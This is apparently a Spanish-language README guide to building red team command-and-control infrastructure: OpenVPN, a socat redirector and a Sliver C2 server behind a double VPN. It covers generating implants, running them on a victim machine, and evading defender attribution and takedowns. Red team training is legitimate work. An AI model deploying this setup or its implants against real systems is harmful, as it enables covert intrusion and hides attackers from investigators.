# Red Team infraestructura

---
Recrearemos una infraestructura Red Team donde levantaremos un `Redirector`, un `C2` y tambien desplegaremos un `Servidor Openvpn` mas una conexion VPN contratada.

* Este tipo de infraestructura es comun en Operaciones Red Team, aunque pueden llegar a ser mas simples o por el contrario mucho mas complejas

```mermaid
flowchart LR
    Victima["💻 Máquina Víctima (Implante Sliver)"]
    Redirector["🔀 Redirector (socat)"]
    ServidorC2["🖥️ Servidor Sliver C2"]
    Operador["👤 Operador C2"]

    %% Flujo principal
    Victima -->|"Conexión Internet"| Redirector -->|"Reenvío de tráfico"| ServidorC2

    %% Red VPN doble
    subgraph VPNs ["Túnel de Doble VPN"]
        direction LR
        ServidorC2 -->|"Conexion VPN 1"| NordVPN["🌐 NordVPN"]
        Operador -->|"Conexion VPN 1"| NordVPN
        NordVPN --> OpenVPN["🔒 Servidor OpenVPN 10.10.10.0/24"]
    end

    %% Direcciones en la red interna
    ServidorC2 <-->|"Conexion VPN 2 - IP interna 10.10.10.10"| OpenVPN
    Operador <-->|"Conexion VPN 2 - IP interna 10.10.10.6"| OpenVPN

    %% Administración
    Operador -->|"Control Sliver 10.10.10.10:31337"| ServidorC2
```




---


## Requisitos para el Despliegue de la infraestructura

* VPS donde se levantara el servidor Openvpn
* VPS donde desplegaremos el servidor Sliver C2
* VPS donde implementaremos el redirector
* VPN sin registros de log, ejemplo: nordvpn

### Despliegue del Servidor Openvpn

Este servidor juega un papel fundamental en la infraestructura para anadir una capa de seguridad/anonimato en la conexion del `Operador C2` y el `Servidor Sliver C2` ya que la comunicacion se realizara a traves de esta `VPN` 

---

Actualizacion e Instalacion de Paquetes:

```bash
sudo apt update -y && sudo apt install openvpn easy-rsa -y
```

---

Configurar Easy-RSA (PKI)

```bash
mkdir ~/easy-rsa
```
```bash
cp -r /usr/share/easy-rsa/* ~/easy-rsa/
```
```bash
cd ~/easy-rsa
```

---

Edita el archivo de variables vars.example

* Configura estos valores (ajústalos a tu necesidad):

```bash
set_var EASYRSA_REQ_COUNTRY   "US"
set_var EASYRSA_REQ_PROVINCE  "California"
set_var EASYRSA_REQ_CITY      "San Francisco"
set_var EASYRSA_REQ_ORG       "MyOrg"
set_var EASYRSA_REQ_EMAIL     "admin@example.com"
set_var EASYRSA_REQ_OU        "IT"
```
---

Inicializa la PKI y genera el CA (Certificado de Autoridad):

```bash
./easyrsa init-pki
```
```bash
./easyrsa build-ca  # Pide una contraseña para el CA (guárdala segura).
```
---

Generar certificados para el servidor y clientes

* Certificado para el servidor:

```bash
./easyrsa gen-req server nopass
```
```bash
./easyrsa sign-req server server  # Firma el certificado con el CA.
```

* Certificado para los cliente (operatorc2 & server C2):

```bash
./easyrsa gen-req operatorc2 nopass
```
```bash
./easyrsa sign-req client operatorc2
```
```bash
./easyrsa gen-req serverc2 nopass
```
```bash
./easyrsa sign-req client serverc2
```

---

Generar Diffie-Hellman y HMAC:

```bash
./easyrsa gen-dh
```
```bash
openvpn --genkey secret ta.key
```

---

Configurar el servidor OpenVPN

```bash
sudo cp ~/easy-rsa/pki/ca.crt /etc/openvpn/server/
```
```bash
sudo cp ~/easy-rsa/pki/issued/server.crt /etc/openvpn/server/
```
```bash
sudo cp ~/easy-rsa/pki/private/server.key /etc/openvpn/server/
```
```bash
sudo cp ~/easy-rsa/pki/dh.pem /etc/openvpn/server/
```
```bash
sudo cp ~/easy-rsa/ta.key /etc/openvpn/server/
```

---

Crea el archivo de configuración del servidor:

```bash
sudo nano /etc/openvpn/server.conf
```
```bash
port 1194
proto udp
dev tun
ca /etc/openvpn/server/ca.crt
cert /etc/openvpn/server/server.crt
key /etc/openvpn/server/server.key
dh /etc/openvpn/server/dh.pem
server 10.10.10.0 255.255.255.0  # Rango de IPs para clientes (10.10.10.1-254)
ifconfig-pool-persist /etc/openvpn/server/ipp.txt
push "route 10.10.10.0 255.255.255.0"  # Clientes ven esta red
keepalive 10 120
tls-auth /etc/openvpn/server/ta.key 0
data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305
persist-key
persist-tun
status /var/log/openvpn-status.log
verb 3
explicit-exit-notify 1  # Solo si proto udp
client-to-client # para comunicacion entre clientes de la vpn
```

---

Habilitar IP Forwarding y NAT (para acceso a Internet)

Edita /etc/sysctl.conf

```bash
net.ipv4.ip_forward=1
```

aplicar cambios

```bash
sudo sysctl -p
```

---

Iniciar y habilitar OpenVPN:

```bash
sudo systemctl start openvpn@server
```
```bash
sudo systemctl enable openvpn@server
```

---

Configurar clientes (operatorc2 & serverc2)

* Creamos un archivo .ovpn para cada cliente con el siguiente contenido:

```bash
client
dev tun
proto udp
remote <IP_PUBLICA_SERVIDOR> 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
key-direction 1
data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305
route-nopull # esta linea y la de abajo nos permitira concatenar la vpn de nordvpn y despues la del servidor openvpn
route 10.10.10.0 255.255.255.0
<ca>
----- contenido ca.crt -----
</ca>
<cert>
----- contenido operatorc2/serverc2.crt -----
</cert>
<key>
----- contenido operatorc2/serverc2.key -----
</key>
<tls-auth>
----- contenido ta.key -----
</tls-auth>
```

* NOTA: Cuando se crea el archivo .ovpn para `operatorc2` se deben agregar sus archivos, es decir `<cert> operatorc2.crt </cert>`, al igual que para `serverc2`, arriba se hace una referencia a los archivos que deben copiarse de cada cliente. Una vez creado los archivos se envian a cada maquina, serverc2.ovpn se aloja en el servidor C2 y operatorc2.ovpn se aloja en la maquina atacante.


### Despliegue del Server Redirector

Esta sera la configuracion mas rapida y facil de realizar ya que un redirector no es mas que un servidor intermedio que se encarga de redireccionar el trafico desde el objetivo infectado hasta el servidor C2

```bash

Maquina infectada (implante) --------> redirector --------> servidor C2

```
---

Actualizacion e Instalacion de Paquetes:

```bash
sudo apt update -y && sudo apt install socat -y
```
---

Configuracion para Socat

```bash
socat tcp-listen:443,fork,reuseaddr tcp:<ip server C2>:8443
```

* Puerto 8443: Puerto por donde se encuentra en escucha el servidor C2 para la conexion con los implantes
* Puerto 443: Puerto al cual se conectaran los implantes Sliver al redirector
* for:  Crea un nuevo proceso para cada conexión (permite múltiples conexiones simultáneas)
* reuseaddr: Permite reutilizar la dirección inmediatamente después de cerrar la conexión

la configuracion de este redirector es basica, lo recomendable es emplear un `reverse-proxy TLS`

---

### Despliegue del Server Sliver C2

En este Servidor es donde estara Sliver-Server corriendo, por lo que tenemos que realizar la instalacion y configuracion de dicho `framework`

---

Actualizacion e Instalacion de Paquetes:

```bash
sudo apt update -y && sudo apt install openvpn -y && apt install golang-go -y 
```

```bash
curl https://sliver.sh/install | bash
```
---
instalacion y activacion del cliente vpn

* Aqui dependera de cada uno si contratar un servicio vpn o saltarse este paso, en mi caso hago uso de `nordvpn` por lo que hacemos la instalacion y configuracion de la misma

```bash
sh <(curl -sSf https://downloads.nordcdn.com/apps/linux/install.sh)
```
```bash
nordvpn login
```
* aqui nos dara una url para acceder por el navegador y autenticarnos


Una vez autenticados volvemos a la terminal y activamos la vpn

```bash
nordvpn c Poland # nos conectamos a un servidor en Polonia por ejemplo
```
* continuamos con la configuracion del servidor Sliver
---

Configuracion de sliver-server

```bash
sliver-server # iniciamos el servidor
```

---

activar el listener de los operadores

```bash
[server] sliver > multiplayer # solo en caso de que no se alla iniciado automaticamente
```

---

Creacion de Operadores

```bash
[server] sliver > new-operator --name [Nombre del operador] --lhost [IP del servidor sliver (aqui va la ip local de la interfaz de la VPN)] --lport 31337
```

* Esto creara un archivo .cfg el cual debe ser enviado al operador para que pueda conectarse al servidor C2

---

Abrir los liteners en el servidor C2

```bash
[server] sliver > mtls --lport 8443
```
* aqui hemos abierto un listener `mtls` para que los implantes puedan conectarse al servidor, el puerto 8443 estara esperando que el redirector le haga llegar la conexion desde el implante, podriamos crear mas listener y de diferentes tipos como `http` o `https`

* para validar los listener ejecutamos:

```bash
[server] sliver > jobs
```

deberiamos ver algo como:

```bash
 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 1    mtls   tcp        8443                 

```

---
Conexion a la VPN controlado por nosotros ( Servidor OpenVPN)

```bash
sudo openvpn serverc2.ovpn &
```

* esto debe asignar una ip privada en la vpn al servidor C2, por ejemplo: IP 10.10.10.10, a traves de esta red es que se establecera la comunicacion con el/los operadores C2


### Configuracion del Cliente Sliver (Maquina/s Atacante/s)

Normalmente un atacante tiene de sistema base kali linux o parrot, por lo que la instalacion de `sliver` la podemos realizar desde los repositorios

```bash
sudo apt install sliver openvpn -y
```
con esta instalacion tendremos tanto el server o como el cliente, pero aqui nos interesa es el cliente sliver y para hacer la conexion con el servidor ya debemos contar con el archivo .cfg que se genero al crear el operador en el servidor C2, en este punto realizamos la misma configuracion de nordvpn que hicismos en el servidor Sliver C2 pero en la maquina atacante/operador

```bash
sh <(curl -sSf https://downloads.nordcdn.com/apps/linux/install.sh)
```
```bash
nordvpn login
```
* aqui nos dara la url para acceder por el navegador y autenticarnos y una vez autenticados volvemos a la terminal y activamos la vpn

```bash
nordvpn c Spain # nos conectamos a un servidor en Espana por ejemplo
```
---

Continuamos ahora con la conexion a la segunda VPN, esta vez la controlado por nosotros, es decir con OpenVPN

```bash
openvpn operatorc2.ovpn # esto nos asignara una ip privada en la vpn tipo 10.10.10.9 desde donde el operador podra conectarse al servidor C2
```

* Una vez conectados a la vpn de OpenVPN pasamos a conectarnos al servidor C2

```bash
sliver-client import operator.cfg # importamos el archivo .cfg que se genero al crear el operador en el servidor C2
```
```bash
sliver-client # nos conectamos el servidor C2
```


una vez conectados al server sliver podemos comenzar a crear los implantes:

```bash
generate --mtls 192.168.100.112:443 --os linux --arch amd64 --format elf --save sliver-payload
```
* La IP y Puerto deben ser los del redirector, donde se encuentra socat en escucha (192.168.100.112:443)
---
Ya creado el implante sliver, lo cargamos en la maquina victima y lanzamos el binario


* La infraestructura a funcionado correctamente ya que hemos obtenido la conexion desde la maquina victima!, hemos levantado una infraestructura `Zero Trust`, es decir, que no confiamos en ningun usuario ni tampoco en ningun punto del sistema, esto garantiza que si el server `OpenVPN` es comprometido por algun motivo, solo puedan llegar a ver las IP's de `Nordvpn` (Una capa mas de seguridad) y no las reales de `Server Sliver C2` ni mucho menos la del `Operador C2`


## ✅ Ventajas de la infraestructura:

* Ocultación del Servidor C2 Real: El redirector actúa como un punto intermedio, ocultando la IP real del servidor C2. Esto dificulta que los defensores rastreen la infraestructura maliciosa hasta el servidor principal.
* Flexibilidad Geográfica: Puedes desplegar el redirector en una región diferente (ej. usando un VPS barato) para evadir bloqueos geográficos o perfiles de tráfico sospechoso.
* Resistencia ante Takedowns: Si el redirector es descubierto y bloqueado, se puede reemplazar rápidamente sin afectar al servidor C2 principal (siempre que se cambie la dirección en el implante).
* Protección contra Análisis de Tráfico: El uso de VPN (NordVPN + OpenVPN) encripta el tráfico entre el servidor C2, el operador y el propio servidor OpenVpn dificultando la interceptación o el análisis por parte de terceros.
* El operador no se conecta nunca directamente al Implante ni al Redirector, la única dirección IP "pública" expuesta en la comunicación con los implantes es la del Redirector. La IP del servidor C2 y del operador estan ocultas por doble VPN

## ❌ Desventajas de la infraestructura

* Punto Único de Falla en el Redirector: Si el redirector cae (ej. suspensión del VPS), todos los implantes pierden conexión hasta que se restablezca o se actualice la dirección en los implantes.
* Complejidad de Configuración: Mantener múltiples servidores (redirector, C2, VPN) requiere más esfuerzo administrativo y conocimiento técnico.
* Latencia Añadida: Cada capa (redirector → servidor C2 → VPN) añade latencia, lo que puede ralentizar la interactividad con los implantes.
* Coste Económico y de Recursos: Necesitas al menos 2-3 servidores (redirector, C2, VPN), lo que incrementa el coste y consumo de recursos.
* Sospecha por Tráfico Encadenado: El tráfico que pasa por múltiples saltos (victima → redirector → C2 → operador) puede ser detectado por herramientas de correlación de tráfico (ej. NetFlow).

## 🔒 Implicaciones de Seguridad para el Operador

* Anonimato: La actividad del operador no puede ser rastreada directamente hasta su ubicación física o IP real desde el lado del objetivo o de un analista de blue team que esté monitorizando el tráfico de la víctima.
* Protección contra Doxing/Ataques de Contrainteligencia: Si el equipo defensivo (Blue Team) logra comprometer el servidor C2, no encontrarán registros de conexión que expongan la IP real del operador, solo encontrarán la IP de la red OpenVPN, pero aun si llegaran a comprometer el servidor OpenVPN tampoco lograrian dar con la IP real del operador ni del C2 porque se ocultan detras de la VPN de NordVPN
* Evita Bloqueos: La red objetivo no puede bloquear la IP del operador, porque nunca la ven.

## 🎯 Recomendaciones de Mejoras

* Usar DNS tunneling o CDN (ej. Cloudflare) para ocultar aún más el tráfico, con esto es posible ocultar hasta la IP publica del redirector ya que se esconde detras de `Cloudflare`
* Implementar redirectores múltiples (load balancing) para evitar puntos únicos de falla.
* Rotar periódicamente las direcciones IP de los redirectores para evadir bloqueos.

## Disclaimer

Propósito Educativo y Ético:
* Este repositorio, incluyendo toda la documentación, código, configuraciones y procedimientos, tiene exclusivamente fines educativos y de investigación en seguridad. Su objetivo es:
  1. Promover el conocimiento en cybersecurity y ethical hacking.
  2. Permitir a profesionales de la seguridad (Red Teams, pentesters, analistas de blue team) comprender las tácticas, tecnicas procedimientos (TTPs) utilizados por adversarios para mejorar las defensas de sus organizaciones.
  3. Ser utilizado en entornos controlados, autorizados y legales, como laboratorios propios o con permiso explícito por escrito del propietario del sistema.
---

### Uso Ético es su Responsabilidad

* El acceso y la posesión de estas herramientas y conocimientos conllevan una gran responsabilidad.
* Usted es el único responsable de cómo utiliza la información contenida en este repositorio.
* No utilice este conocimiento para actividades ilegales o no éticas. El hacking sin autorización explícita es un delito en la mayoría de países.
* Las técnicas aquí descritas no deben ser utilizadas para dañar, comprometer u obtener acceso no autorizado a sistemas, redes o datos de los cuales no sea el propietario o no tenga permiso explícito.
---

### Renuncia de Responsabilidad

* El autor de este repositorio no se hace responsable del mal uso o de los daños causados por la utilización de esta información.
* El contenido se proporciona "tal cual", sin garantías de ningún tipo.
* El usuario asume todo el riesgo asociado al uso de las herramientas y técnicas aquí descritas.
  


